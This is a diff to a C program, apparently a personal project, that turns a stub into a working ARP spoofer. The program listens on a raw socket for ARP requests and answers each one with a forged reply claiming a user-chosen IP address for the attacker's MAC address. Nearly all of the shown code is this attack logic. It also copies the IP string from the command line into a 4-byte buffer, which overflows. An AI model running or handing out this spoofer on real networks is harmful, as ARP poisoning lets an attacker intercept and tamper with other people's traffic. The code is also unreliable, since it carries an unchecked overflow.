@@ -23,7 +23,7 @@
 #include <netinet/in.h>
 
 
-#include <errno.h>            
+#include <errno.h>
 
 #define ETH_HDRLEN 14        
 #define ARP_HDRLEN 28      
@@ -60,7 +60,7 @@ struct arp_hdr *setupArpHdr(uint8_t *src_mac, uint8_t *src_ip, uint8_t *dest_mac
 int main(int argc, char *argv[]) {
 
 
-    int sd, status;             
+    int sd, status, bytes;             
     struct ifreq *ifr;                /* Will hold interface information later */
     struct sockaddr_ll device;        /* Specifies the interface to use for sending packets */
 
@@ -80,10 +80,20 @@ int main(int argc, char *argv[]) {
     char *interface = malloc(40);     /* Interface name, provided by the user */
     char *spoofed_IP = malloc(4);     /* IP to be spoofed, provided by the user */
 
+    uint8_t *spoofed_IP_network = malloc(4); /* IP to be spoofed in network byte order */
+
 
 
     strcpy (interface, argv[1]);      /*Copy user input*/
     strcpy(spoofed_IP,argv[2]);
+
+
+    /* Get spoofed IP network byte order */
+    if ((status = inet_pton (AF_INET, spoofed_IP, spoofed_IP_network)) != 1) {
+        fprintf (stderr, "inet_pton() failed for source IP address.\nError message: %s", strerror (status));
+        exit (EXIT_FAILURE);
+      }
+
 
 
 
@@ -154,48 +164,40 @@ int main(int argc, char *argv[]) {
       printf("received arp request\n");
 
 
+      /* Set up ethernet and ARP hdr for our ARP reply */
+      struct eth_hdr *eth_rsp = setupEthHdr(recv_arp->src_mac,my_mac);
+      struct arp_hdr *arp_rsp = setupArpHdr(my_mac,spoofed_IP_network,recv_arp->src_mac, recv_arp->src_ip);
+
+      char *msg = malloc(sizeof(struct arp_hdr) + sizeof(struct eth_hdr));
+      memcpy(msg,eth_rsp,sizeof(struct eth_hdr));
+      memcpy(msg + sizeof(struct eth_hdr), arp_rsp, sizeof(struct arp_hdr));
+
+
+      /* Open the socket to send */
+      if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
+        printf("%s\n",strerror(errno));
+        return(1);
+      }
+
+      /* Send */
+      if ((bytes = sendto (sd, msg, ETH_HDRLEN + ARP_HDRLEN, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
+        perror ("sendto() failed");
+        exit (EXIT_FAILURE);
+      }
+
+
+      free(msg);
+      free(eth_rsp);
+      free(arp_rsp);
+
+
     }
-
-
-
-
-/*********Dummy send code for now, will be changed later**********/
-/*
-  //Dummy destination, will be replaced later with whoever is sending the ARP request 
-  uint8_t *dest_mac = malloc(6);
-  memset(dest_mac,0xFF,6);
-
-  
-
-
-  struct eth_hdr *eth_hdr = setupEthHdr(dest_mac,my_mac);
-  struct arp_hdr *arp_hdr = setupArpHdr(my_mac,spoofed_IP,dest_mac,"192.168.1.254");
-
-  uint8_t *msg = malloc(sizeof(struct eth_hdr) + sizeof(struct arp_hdr));
-  memcpy(msg,eth_hdr,ETH_HDRLEN);
-  memcpy(msg+ETH_HDRLEN,arp_hdr,ARP_HDRLEN);
-
-
-
-
-
-  if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
-      printf("%s\n",strerror(errno));
-      return(1);
-  }
-
-  if ((bytes = sendto (sd, msg, ETH_HDRLEN + ARP_HDRLEN, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
-    perror ("sendto() failed");
-    exit (EXIT_FAILURE);
-  }
-  */
-/**********End of dummy code*********/
 
   return(0);
 }
 
 
-/* Returns a filled out arp_hdr (ARP reply to be specific) with the given addresses */
+/* Returns a filled out arp_hdr (ARP reply to be specific) with the given addresses in network byte order*/
 struct arp_hdr *setupArpHdr(uint8_t *src_mac, uint8_t *src_ip, uint8_t *dest_mac, uint8_t *dest_ip)
 {
 
@@ -210,18 +212,10 @@ struct arp_hdr *setupArpHdr(uint8_t *src_mac, uint8_t *src_ip, uint8_t *dest_mac
   hdr->plen = 4;
   hdr->opcode = htons(ARP_REPLY_OP);
 
-  /* Translate IPs.. */
-  if ((status = inet_pton (AF_INET, src_ip, hdr->src_ip)) != 1) {
-    fprintf (stderr, "inet_pton() failed for source IP address.\nError message: %s", strerror (status));
-    exit (EXIT_FAILURE);
-  }
-
-  if ((status = inet_pton (AF_INET, dest_ip, hdr->dest_ip)) != 1) {
-    fprintf (stderr, "inet_pton() failed for source IP address.\nError message: %s", strerror (status));
-    exit (EXIT_FAILURE);
-  }
-
-
+  /* Copy in the IPs */
+  memcpy(hdr->src_ip,src_ip,4);
+  memcpy(hdr->dest_ip, dest_ip, 4);
+  
   /* Copy in the MAC Addresses */
   memcpy(hdr->src_mac, src_mac, 6);
   memcpy(hdr->dest_mac, dest_mac, 6);
